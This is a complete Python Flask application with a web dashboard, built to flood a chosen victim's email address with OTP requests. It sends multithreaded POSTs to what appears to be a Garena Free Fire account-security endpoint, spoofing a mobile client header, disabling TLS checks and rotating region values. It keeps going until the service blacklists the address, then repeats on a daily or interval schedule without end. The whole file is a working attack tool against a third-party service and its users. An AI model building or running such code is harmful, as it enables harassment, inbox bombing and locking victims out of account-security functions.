# lang: Python, file: app.py, target: Windows 11, Python 3.10+
# FF OTP Blacklist Tool — One Button Auto Mode

from flask import Flask, render_template_string, request, jsonify
import requests
import threading
import time
import random
import urllib3
from datetime import datetime, timedelta
urllib3.disable_warnings()

app = Flask(__name__)

ENDPOINT = "https://ffmconnect.ggstudionow.com/game/account_security/swap:send_otp"

HEADERS = {
    "User-Agent":      "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
    "Content-Type":    "application/x-www-form-urlencoded",
    "Accept":          "application/json",
    "Accept-Encoding": "gzip",
    "Connection":      "Keep-Alive",
}

REGIONS = ["IND", "MY", "SG", "TH", "ID", "VN", "TW", "BD", "PK"]
LOCALES = ["en_MA", "en_US", "en_IN", "en_SG"]

BLACKLIST_SIGNALS = [
    "too many", "rate limit", "exceeded", "blocked",
    "suspended", "temporarily", "quota", "limit reached",
    "try again later", "email_blocked", "email_limit", "send_limit",
]

BLACKLIST_THRESHOLD = 10

_lock       = threading.Lock()
_stop_event = threading.Event()

_state = {
    "phase":          "idle",
    # idle | waiting | flooding | blacklisted | done
    "email":          "",
    "cycle":          0,
    "sent":           0,
    "success":        0,
    "fail":           0,
    "ratelimit":      0,
    "consec_rl":      0,
    "last_status":    "",
    "next_fire":      None,
    "next_fire_ts":   None,
    "cycle_start":    None,
    "total_sent":     0,
    "total_success":  0,
    "blacklist_log":  [],
    "mode":           "schedule",  # "schedule" | "interval"
    "sched_hour":     3,
    "sched_minute":   0,
    "interval_hours": 24,
    "threads":        50,
    "delay":          0.1,
    "duration":       300,
}


def is_blacklisted(text: str, code: int) -> bool:
    if code == 429:
        return True
    return any(sig in text.lower() for sig in BLACKLIST_SIGNALS)


def next_sched_ts(hour: int, minute: int) -> float:
    now = datetime.now()
    c   = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
    if c <= now:
        c += timedelta(days=1)
    return c.timestamp()


def flood_wave(email, threads, delay_min, delay_max, duration_s, wave_stop):
    def worker():
        sess = requests.Session()
        sess.headers.update(HEADERS)
        sess.verify = False
        while not wave_stop.is_set() and not _stop_event.is_set():
            try:
                r = sess.post(ENDPOINT, data={
                    "app_id": "100067",
                    "email":  email,
                    "locale": random.choice(LOCALES),
                    "region": random.choice(REGIONS),
                }, timeout=10)

                with _lock:
                    _state["sent"]       += 1
                    _state["total_sent"] += 1

                    if r.status_code == 200 and '"result":0' in r.text:
                        _state["success"]       += 1
                        _state["total_success"] += 1
                        _state["consec_rl"]      = 0
                        _state["last_status"]    = f"✓ OTP hit #{_state['sent']}"

                    elif is_blacklisted(r.text, r.status_code):
                        _state["ratelimit"] += 1
                        _state["consec_rl"] += 1
                        _state["last_status"] = f"⚠ rate signal {_state['consec_rl']}/{BLACKLIST_THRESHOLD}"

                        if _state["consec_rl"] >= BLACKLIST_THRESHOLD:
                            _state["phase"]       = "blacklisted"
                            _state["last_status"] = f"🚫 BLACKLISTED — {email} — wave stopped"
                            _state["blacklist_log"].append({
                                "email": email,
                                "time":  datetime.now().strftime("%H:%M:%S %d/%m"),
                                "cycle": _state["cycle"],
                                "sent":  _state["sent"],
                            })
                            wave_stop.set()
                    else:
                        _state["consec_rl"]   = 0
                        _state["last_status"] = f"#{_state['sent']} {r.status_code} {r.text[:60]}"

            except Exception:
                with _lock:
                    _state["fail"] += 1

            time.sleep(random.uniform(delay_min, delay_max))

    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

    deadline = time.time() + duration_s
    while time.time() < deadline and not wave_stop.is_set() and not _stop_event.is_set():
        time.sleep(0.5)
    wave_stop.set()


def auto_runner(email, threads, delay, duration, mode, sched_hour, sched_minute, interval_hours):
    """
    AUTO MODE:
    - waits for scheduled time OR interval
    - fires flood wave
    - detects blacklist → stops wave
    - waits again for next slot
    - repeats forever until STOP
    """
    with _lock:
        _state["cycle"]         = 0
        _state["total_sent"]    = 0
        _state["total_success"] = 0
        _state["blacklist_log"] = []
        _state["email"]         = email

    while not _stop_event.is_set():

        # ── calculate next fire time ─────────────────────────────────────────
        if mode == "schedule":
            nf_ts = next_sched_ts(sched_hour, sched_minute)
        else:
            nf_ts = time.time() + (interval_hours * 3600)

        nf_str = datetime.fromtimestamp(nf_ts).strftime("%H:%M:%S %d/%m")

        with _lock:
            _state["phase"]        = "waiting"
            _state["next_fire"]    = nf_str
            _state["next_fire_ts"] = nf_ts
            _state["last_status"]  = f"⏳ waiting — fires at {nf_str}"

        # ── wait ─────────────────────────────────────────────────────────────
        while time.time() < nf_ts and not _stop_event.is_set():
            time.sleep(1)

        if _stop_event.is_set():
            break

        # ── fire ─────────────────────────────────────────────────────────────
        with _lock:
            _state["cycle"]       += 1
            _state["sent"]         = 0
            _state["success"]      = 0
            _state["fail"]         = 0
            _state["ratelimit"]    = 0
            _state["consec_rl"]    = 0
            _state["phase"]        = "flooding"
            _state["next_fire"]    = None
            _state["next_fire_ts"] = None
            _state["cycle_start"]  = datetime.now().strftime("%H:%M:%S %d/%m")
            cn = _state["cycle"]

        _state["last_status"] = f"🔥 cycle {cn} firing — {datetime.now().strftime('%H:%M:%S')}"

        wave_stop = threading.Event()
        flood_wave(email, threads, delay * 0.8, delay * 1.2, duration, wave_stop)

        if _stop_event.is_set():
            break

        # ── post wave ─────────────────────────────────────────────────────────
        with _lock:
            bl = _state["phase"] == "blacklisted"

        if bl:
            _state["last_status"] = (
                f"🚫 cycle {cn} blacklisted — "
                f"cooling until next slot ({'schedule' if mode=='schedule' else str(interval_hours)+'h'})"
            )
        else:
            _state["last_status"] = f"✅ cycle {cn} complete — queuing next"

        # loop — next iter calculates the new slot and waits

    with _lock:
        _state["phase"]       = "idle"
        _state["last_status"] = "⛔ stopped"


HTML = """
<!DOCTYPE html>
<html>
<head>
<title>FF Auto Blacklist</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#08080e;color:#ddd;font-family:'Courier New',monospace;min-height:100vh}

.header{
    background:linear-gradient(135deg,#120820,#0e1628);
    border-bottom:2px solid #ff3333;
    padding:16px 36px;
    display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px
}
.header h1{font-size:20px;color:#ff3333;letter-spacing:4px}
.header .sub{font-size:9px;color:#333;letter-spacing:2px;margin-top:3px}
.clock{font-size:26px;color:#3377ff;letter-spacing:3px;font-weight:bold;font-variant-numeric:tabular-nums}
.clock-date{font-size:9px;color:#333;letter-spacing:1px;text-align:right;margin-top:2px}

.wrap{max-width:860px;margin:30px auto;padding:0 18px}
.card{background:#0f0f18;border:1px solid #1a1a28;border-radius:10px;padding:24px;margin-bottom:16px}
.card-title{color:#ff3333;font-size:9px;letter-spacing:3px;text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:8px}
.card-title::after{content:'';flex:1;height:1px;background:#1a1a28}

/* ── BIG AUTO BUTTON ── */
.auto-btn{
    width:100%;padding:22px;
    background:linear-gradient(135deg,#ff3333,#cc0000);
    border:none;border-radius:10px;
    font-family:'Courier New',monospace;
    font-size:18px;font-weight:bold;letter-spacing:4px;
    color:#fff;cursor:pointer;
    box-shadow:0 0 30px #ff333340;
    transition:all .2s;
    text-transform:uppercase;
}
.auto-btn:hover{background:linear-gradient(135deg,#ff5555,#ff2222);box-shadow:0 0 50px #ff333360}
.auto-btn:active{transform:scale(.98)}
.auto-btn.running{
    background:linear-gradient(135deg,#333,#222);
    box-shadow:0 0 20px #ff333320;
    color:#666;
}
.stop-btn{
    width:100%;padding:14px;margin-top:10px;
    background:transparent;
    border:1px solid #ff3333;border-radius:8px;
    font-family:'Courier New',monospace;
    font-size:12px;font-weight:bold;letter-spacing:3px;
    color:#ff3333;cursor:pointer;transition:all .2s;
}
.stop-btn:hover{background:#ff333315}

/* ── INPUTS ── */
.row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px}
.iw{flex:1;min-width:130px}
label{display:block;font-size:9px;color:#444;letter-spacing:2px;text-transform:uppercase;margin-bottom:5px}
input,select{
    width:100%;background:#080810;border:1px solid #222230;
    border-radius:5px;color:#ddd;padding:9px 12px;
    font-family:'Courier New',monospace;font-size:13px;outline:none;transition:border .2s
}
input:focus,select:focus{border-color:#ff3333}
select option{background:#0f0f18}

/* ── MODE TOGGLE ── */
.mode-row{display:flex;gap:0;margin-bottom:14px;border:1px solid #1a1a28;border-radius:6px;overflow:hidden}
.mtab{flex:1;padding:9px;text-align:center;cursor:pointer;font-size:9px;letter-spacing:2px;text-transform:uppercase;background:#080810;color:#333;transition:all .2s}
.mtab.on{background:#ff333318;color:#ff3333;border-bottom:2px solid #ff3333}

/* ── STATUS RING ── */
.status-ring{
    width:120px;height:120px;border-radius:50%;
    border:3px solid #1a1a28;
    display:flex;flex-direction:column;align-items:center;justify-content:center;
    margin:0 auto 20px;transition:all .4s;
    position:relative;
}
.status-ring.idle   {border-color:#222}
.status-ring.waiting{border-color:#3377ff;box-shadow:0 0 20px #3377ff30;animation:ringpulse 2s infinite}
.status-ring.flooding{border-color:#ff3333;box-shadow:0 0 30px #ff333350;animation:ringpulse .8s infinite}
.status-ring.blacklisted{border-color:#ff8800;box-shadow:0 0 20px #ff880040}
.status-ring.done   {border-color:#44ff88;box-shadow:0 0 20px #44ff8830}
@keyframes ringpulse{0%,100%{opacity:1}50%{opacity:.5}}
.ring-icon{font-size:28px;margin-bottom:4px}
.ring-label{font-size:8px;letter-spacing:2px;color:#555;text-transform:uppercase}
.ring-cycle{font-size:11px;color:#ff3333;margin-top:2px;font-weight:bold}

/* ── PHASE BAR ── */
.pbar{
    background:#080810;border:1px solid #1a1a28;border-radius:6px;
    padding:12px 16px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;
    margin-bottom:14px
}
.pill{border-radius:20px;padding:3px 12px;font-size:9px;letter-spacing:1px;white-space:nowrap}
.p-red   {background:#ff333320;border:1px solid #ff3333;color:#ff3333}
.p-blue  {background:#3377ff20;border:1px solid #3377ff;color:#3377ff}
.p-orange{background:#ff880020;border:1px solid #ff8800;color:#ff8800}
.p-green {background:#44ff8820;border:1px solid #44ff88;color:#44ff88}
.countdown{font-size:13px;color:#ffaa00;font-weight:bold;font-variant-numeric:tabular-nums;letter-spacing:1px;margin-left:auto}

/* ── STATS ── */
.sgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:8px}
.sbox{background:#080810;border:1px solid #1a1a28;border-radius:6px;padding:14px;text-align:center}
.sbox .v{font-size:22px;font-weight:bold;color:#ff3333;font-variant-numeric:tabular-nums}
.sbox .l{font-size:7px;color:#333;letter-spacing:2px;text-transform:uppercase;margin-top:4px}
.c-green .v{color:#44ff88}.c-yellow .v{color:#ffaa00}
.c-blue .v{color:#3377ff}.c-purple .v{color:#aa44ff}

/* ── LOG ── */
.logbox{background:#080810;border:1px solid #1a1a28;border-radius:5px;padding:12px;height:190px;overflow-y:auto;font-size:10px;line-height:1.9}
.ll{color:#2a2a3a}.lhit{color:#44ff88}.lfail{color:#ff3333}
.linf{color:#3377ff}.lwait{color:#ffaa00}.lbl{color:#ff3333;font-weight:bold}.lok{color:#44ff88;font-weight:bold}

/* ── BL LOG ── */
.blentry{background:#080810;border:1px solid #ff333325;border-radius:4px;padding:8px 12px;margin-bottom:6px;font-size:10px;color:#555}
.blentry .bm{color:#ff3333}

/* ── BANNER ── */
.banner{display:none;border-radius:8px;padding:14px 20px;margin-bottom:14px;text-align:center}
.banner.show{display:block}
.ban-bl{background:#ff333310;border:2px solid #ff3333}
.ban-bl .bt{font-size:16px;color:#ff3333;letter-spacing:3px;margin-bottom:4px}
.ban-bl .bs{font-size:10px;color:#666}
.ban-ok{background:#44ff8810;border:2px solid #44ff88}
.ban-ok .bt{font-size:14px;color:#44ff88;letter-spacing:2px;margin-bottom:4px}
.ban-ok .bs{font-size:10px;color:#555}
</style>
</head>
<body>

<div class="header">
    <div>
        <h1>⚡ FF AUTO BLACKLIST</h1>
        <div class="sub">SET EMAIL · SET TIME · PRESS GO · DONE</div>
    </div>
    <div>
        <div class="clock" id="clk">00:00:00</div>
        <div class="clock-date" id="clkd"></div>
    </div>
</div>

<div class="wrap">

    <!-- blacklist banner -->
    <div class="banner ban-bl" id="bl-ban">
        <div class="bt">🚫 MAIL BLACKLISTED</div>
        <div class="bs" id="bl-bs">OTP suspended — cooling until next slot</div>
    </div>

    <!-- success banner -->
    <div class="banner ban-ok" id="ok-ban">
        <div class="bt">✅ WAVE COMPLETE</div>
        <div class="bs" id="ok-bs">auto-queued for next slot</div>
    </div>

    <!-- ── CONFIG CARD ── -->
    <div class="card">
        <div class="card-title">⚙ Setup</div>

        <div class="row">
            <div class="iw" style="flex:3">
                <label>Target Email</label>
                <input type="email" id="email" placeholder="victim@gmail.com">
            </div>
            <div class="iw">
                <label>Threads</label>
                <input type="number" id="threads" value="50" min="1" max="300">
            </div>
            <div class="iw">
                <label>Wave Duration (s)</label>
                <input type="number" id="duration" value="300" min="30">
            </div>
        </div>

        <!-- mode -->
        <div class="mode-row">
            <div class="mtab on" id="mt-sched" onclick="setMode('schedule')">⏰ EXACT TIME DAILY</div>
            <div class="mtab"    id="mt-ivl"   onclick="setMode('interval')">🔁 EVERY N HOURS</div>
        </div>

        <!-- schedule inputs -->
        <div id="pnl-sched">
            <div class="row" style="align-items:flex-end">
                <div class="iw">
                    <label>Hour (0–23)</label>
                    <input type="number" id="sh" value="3" min="0" max="23" oninput="updPrev()">
                </div>
                <div class="iw">
                    <label>Minute (0–59)</label>
                    <input type="number" id="sm" value="0" min="0" max="59" oninput="updPrev()">
                </div>
                <div class="iw">
                    <label>Fires Every Day At</label>
                    <div style="font-size:26px;color:#3377ff;letter-spacing:4px;font-weight:bold;padding:6px 0;font-variant-numeric:tabular-nums" id="tprev">03:00</div>
                </div>
            </div>
        </div>

        <!-- interval inputs -->
        <div id="pnl-ivl" style="display:none">
            <div class="row">
                <div class="iw">
                    <label>Repeat Every (hours)</label>
                    <input type="number" id="ivl" value="24" min="1" max="168">
                </div>
                <div class="iw" style="display:flex;align-items:flex-end;padding-bottom:2px">
                    <div style="font-size:12px;color:#444;letter-spacing:1px">fires once, waits N hours, fires again — forever</div>
                </div>
            </div>
        </div>

        <!-- THE BUTTON -->
        <button class="auto-btn" id="go-btn" onclick="goAuto()">
            🚀 AUTO BLACKLIST
        </button>
        <button class="stop-btn" id="stop-btn" onclick="stopAll()" style="display:none">
            ■ STOP ALL
        </button>
    </div>

    <!-- ── STATUS RING + PHASE ── -->
    <div class="card" id="status-card" style="display:none">
        <div class="card-title">📡 Live Status</div>

        <div class="status-ring idle" id="sring">
            <div class="ring-icon" id="ring-icon">💤</div>
            <div class="ring-label" id="ring-label">IDLE</div>
            <div class="ring-cycle" id="ring-cycle"></div>
        </div>

        <div class="pbar">
            <div class="pill p-blue" id="cycle-pill">CYCLE 0</div>
            <div id="phase-pill"></div>
            <div class="countdown" id="cd"></div>
        </div>
    </div>

    <!-- ── STATS ── -->
    <div class="card">
        <div class="card-title">📊 Stats</div>
        <div class="sgrid">
            <div class="sbox">          <div class="v" id="s0">0</div><div class="l">This Wave</div></div>
            <div class="sbox c-green">  <div class="v" id="s1">0</div><div class="l">OTPs Hit</div></div>
            <div class="sbox c-yellow"> <div class="v" id="s2">0%</div><div class="l">Hit Rate</div></div>
            <div class="sbox c-blue">   <div class="v" id="s3">0</div><div class="l">Rate Signals</div></div>
            <div class="sbox c-purple"> <div class="v" id="s4">0</div><div class="l">Total Sent</div></div>
            <div class="sbox c-green">  <div class="v" id="s5">0</div><div class="l">Total Hits</div></div>
        </div>
    </div>

    <!-- ── LOG ── -->
    <div class="card">
        <div class="card-title">📟 Log</div>
        <div class="logbox" id="log"></div>
    </div>

    <!-- ── BL HISTORY ── -->
    <div class="card" id="bl-hist" style="display:none">
        <div class="card-title">🚫 Blacklist History</div>
        <div id="bl-list"></div>
    </div>

</div>

<script>
let poll=null, cd=null, lastLog='', blc=0, mode='schedule';

setInterval(()=>{
    const n=new Date();
    document.getElementById('clk').textContent=n.toLocaleTimeString('en-GB');
    document.getElementById('clkd').textContent=n.toLocaleDateString('en-GB',{weekday:'short',day:'2-digit',month:'short',year:'numeric'});
},1000);

function pad(n){return String(n).padStart(2,'0')}
function updPrev(){
    const h=pad(document.getElementById('sh').value||0);
    const m=pad(document.getElementById('sm').value||0);
    document.getElementById('tprev').textContent=h+':'+m;
}
function setMode(m){
    mode=m;
    document.getElementById('mt-sched').className='mtab'+(m==='schedule'?' on':'');
    document.getElementById('mt-ivl').className  ='mtab'+(m==='interval'?' on':'');
    document.getElementById('pnl-sched').style.display=m==='schedule'?'':'none';
    document.getElementById('pnl-ivl').style.display  =m==='interval'?'':'none';
}

function log(msg,cls='ll'){
    if(msg===lastLog)return; lastLog=msg;
    const b=document.getElementById('log');
    const d=document.createElement('div');
    d.className=cls;
    d.textContent='['+new Date().toLocaleTimeString('en-GB')+'] '+msg;
    b.appendChild(d);
    if(b.children.length>400)b.removeChild(b.firstChild);
    b.scrollTop=b.scrollHeight;
}

async function goAuto(){
    const email=document.getElementById('email').value.trim();
    if(!email){log('enter target email','lfail');return;}

    const payload={
        email,
        threads: parseInt(document.getElementById('threads').value),
        delay:   0.1,
        duration:parseInt(document.getElementById('duration').value),
        mode,
        hour:    parseInt(document.getElementById('sh').value||3),
        minute:  parseInt(document.getElementById('sm').value||0),
        interval:parseInt(document.getElementById('ivl').value||24),
    };

    clearBan();
    const r=await fetch('/go',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
    const d=await r.json();
    if(d.ok){
        const mstr=mode==='schedule'
            ? 'fires daily at '+pad(payload.hour)+':'+pad(payload.minute)
            : 'fires every '+payload.interval+'h';
        log('🚀 auto started → '+email+' — '+mstr,'linf');
        document.getElementById('go-btn').classList.add('running');
        document.getElementById('go-btn').textContent='⏳ RUNNING...';
        document.getElementById('stop-btn').style.display='';
        document.getElementById('status-card').style.display='block';
        startPoll();
    }else log('error: '+d.error,'lfail');
}

async function stopAll(){
    const r=await fetch('/stop',{method:'POST'});
    const d=await r.json();
    log('⛔ stopped — total: '+d.total_sent,'lfail');
    resetBtn(); clearBan(); stopPoll();
}

function resetBtn(){
    const b=document.getElementById('go-btn');
    b.classList.remove('running');
    b.textContent='🚀 AUTO BLACKLIST';
    document.getElementById('stop-btn').style.display='none';
}
function clearBan(){
    document.getElementById('bl-ban').classList.remove('show');
    document.getElementById('ok-ban').classList.remove('show');
}

function startPoll(){
    if(poll)clearInterval(poll);
    poll=setInterval(async()=>{
        const r=await fetch('/stats');
        const s=await r.json();

        document.getElementById('s0').textContent=s.sent;
        document.getElementById('s1').textContent=s.success;
        document.getElementById('s3').textContent=s.ratelimit;
        document.getElementById('s4').textContent=s.total_sent;
        document.getElementById('s5').textContent=s.total_success;
        document.getElementById('s2').textContent=s.sent>0?((s.success/s.sent)*100).toFixed(1)+'%':'0%';
        document.getElementById('cycle-pill').textContent='CYCLE '+s.cycle;

        const ring=document.getElementById('sring');
        const icon=document.getElementById('ring-icon');
        const rlbl=document.getElementById('ring-label');
        const rcyc=document.getElementById('ring-cycle');
        const pp  =document.getElementById('phase-pill');
        const cdEl=document.getElementById('cd');

        ring.className='status-ring '+s.phase;

        if(s.phase==='flooding'){
            icon.textContent='🔥'; rlbl.textContent='FLOODING';
            rcyc.textContent='CYCLE '+s.cycle;
            pp.innerHTML='<span class="pill p-red">⚡ FLOODING</span>';
            cdEl.textContent=''; clearCd();
            clearBan();
        } else if(s.phase==='waiting'){
            icon.textContent='⏳'; rlbl.textContent='WAITING';
            rcyc.textContent=s.next_fire||'';
            pp.innerHTML='<span class="pill p-blue">⏰ NEXT: '+(s.next_fire||'...')+'</span>';
            if(s.next_fire_ts) startCd(s.next_fire_ts);
        } else if(s.phase==='blacklisted'){
            icon.textContent='🚫'; rlbl.textContent='BLACKLISTED';
            rcyc.textContent='COOLING';
            pp.innerHTML='<span class="pill p-orange">🚫 COOLING — NEXT: '+(s.next_fire||'...')+'</span>';
            document.getElementById('bl-ban').classList.add('show');
            document.getElementById('bl-bs').textContent=
                s.email+' OTP suspended — auto-resumes at '+(s.next_fire||'next slot');
            if(s.next_fire_ts) startCd(s.next_fire_ts);
        } else if(s.phase==='idle'){
            icon.textContent='💤'; rlbl.textContent='IDLE'; rcyc.textContent='';
            pp.innerHTML=''; cdEl.textContent=''; clearCd(); resetBtn();
        }

        if(s.blacklist_log&&s.blacklist_log.length>blc){
            blc=s.blacklist_log.length;
            document.getElementById('bl-hist').style.display='block';
            const list=document.getElementById('bl-list'); list.innerHTML='';
            s.blacklist_log.forEach(e=>{
                const d=document.createElement('div');
                d.className='blentry';
                d.innerHTML='<span class="bm">🚫</span> '+e.email+' — cycle '+e.cycle+' — '+e.time+' — '+e.sent+' reqs';
                list.appendChild(d);
            });
        }

        if(s.last_status){
            const cls=
                s.last_status.includes('✓')          ?'lhit' :
                s.last_status.includes('BLACKLIST')   ?'lbl'  :
                s.last_status.includes('✅')           ?'lok'  :
                s.last_status.includes('⚠')           ?'lfail':
                s.last_status.includes('⏳')||s.last_status.includes('wait')?'lwait':
                s.last_status.includes('🔥')||s.last_status.includes('firing')?'linf':'ll';
            log(s.last_status,cls);
        }
    },800);
}

function startCd(ts){
    clearCd();
    cd=setInterval(()=>{
        const diff=ts*1000-Date.now();
        const el=document.getElementById('cd');
        if(diff<=0){el.textContent='firing now...';clearCd();return;}
        const h=Math.floor(diff/3600000),m=Math.floor((diff%3600000)/60000),s=Math.floor((diff%60000)/1000);
        el.textContent=pad(h)+':'+pad(m)+':'+pad(s)+' until next wave';
    },1000);
}
function clearCd(){if(cd){clearInterval(cd);cd=null;}}
function stopPoll(){if(poll){clearInterval(poll);poll=null;}clearCd();}
</script>
</body>
</html>
"""


@app.route("/")
def index():
    return render_template_string(HTML)


@app.route("/go", methods=["POST"])
def go():
    global _stop_event
    data = request.get_json()
    email    = data.get("email", "")
    threads  = int(data.get("threads", 50))
    delay    = float(data.get("delay", 0.1))
    duration = int(data.get("duration", 300))
    mode     = data.get("mode", "schedule")
    hour     = int(data.get("hour", 3))
    minute   = int(data.get("minute", 0))
    interval = int(data.get("interval", 24))

    if not email:
        return jsonify({"ok": False, "error": "no email"})

    _stop_event.set()
    time.sleep(0.3)
    _stop_event = threading.Event()

    with _lock:
        _state.update({
            "email": email, "threads": threads,
            "delay": delay, "duration": duration,
            "mode": mode, "sched_hour": hour,
            "sched_minute": minute, "interval_hours": interval,
        })

    threading.Thread(
        target=auto_runner,
        args=(email, threads, delay, duration, mode, hour, minute, interval),
        daemon=True
    ).start()

    return jsonify({"ok": True})


@app.route("/stop", methods=["POST"])
def stop():
    _stop_event.set()
    return jsonify({"ok": True, "total_sent": _state["total_sent"]})


@app.route("/stats")
def stats():
    with _lock:
        return jsonify({
            "phase":         _state["phase"],
            "email":         _state["email"],
            "cycle":         _state["cycle"],
            "sent":          _state["sent"],
            "success":       _state["success"],
            "fail":          _state["fail"],
            "ratelimit":     _state["ratelimit"],
            "last_status":   _state["last_status"],
            "next_fire":     _state["next_fire"],
            "next_fire_ts":  _state["next_fire_ts"],
            "total_sent":    _state["total_sent"],
            "total_success": _state["total_success"],
            "blacklist_log": _state["blacklist_log"],
            "mode":          _state["mode"],
            "sched_hour":    _state["sched_hour"],
            "sched_minute":  _state["sched_minute"],
        })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
